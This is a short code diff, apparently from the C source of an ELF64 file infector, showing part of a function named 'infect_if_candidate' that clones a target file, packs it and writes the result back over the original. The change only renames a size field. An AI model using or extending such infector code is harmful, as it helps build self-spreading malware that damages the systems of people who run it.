@@ -56,10 +56,10 @@ inline bool	infect_if_candidate(const char *file)
 	if (!original_accessor(&food.original_safe, file))
 		return errors(ERR_THROW, '8','5');
 
-	if (!clone_accessor(&food.clone_safe, food.original_safe.filesize))
+	if (!clone_accessor(&food.clone_safe, food.original_safe.size))
 		return errors(ERR_THROW, '8','6');
 
-	if (!elf64_packer(food, food.original_safe.filesize))
+	if (!elf64_packer(food, food.original_safe.size))
 		return errors(ERR_THROW, '8','7');
 
 	write_clone_file(food.clone_safe, file);
